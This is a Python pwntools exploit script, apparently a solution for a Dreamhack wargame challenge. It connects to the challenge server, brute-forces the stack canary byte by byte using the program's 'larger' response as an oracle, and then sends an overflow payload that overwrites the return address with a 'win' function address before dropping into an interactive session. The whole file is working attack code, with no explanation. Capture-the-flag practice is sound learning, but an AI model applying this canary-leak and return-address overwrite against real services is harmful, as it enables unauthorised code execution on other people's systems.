from pwn import *

HOST, PORT = '0.0.0.0', 31337
HOST, PORT = 'host3.dreamhack.games', 9199
r = remote(HOST, PORT)

win=0x40125b
canary=b''
for j in range(7):
    for i in range(1,256):
        r.sendlineafter(b'):', b'n')
        r.sendafter(b': ', b'A'*(25)+canary+int.to_bytes(i)+b'\xff')
        r.sendafter(b': ', b'A'*(25))
        res = r.recvline().strip()

        if b'larger' in res:
            canary += int.to_bytes(i)
            break
canary = u64(canary.ljust(8,b'\x00')) << 8

r.sendlineafter(b': ', b'n')
r.sendlineafter(b': ', b'A'*24+p64(canary)+b'A'*8+p64(win))
r.sendlineafter(b': ', b'A'*24+p64(canary)+b'A'*8+p64(win))
r.sendlineafter(b': ', b'y')
r.interactive()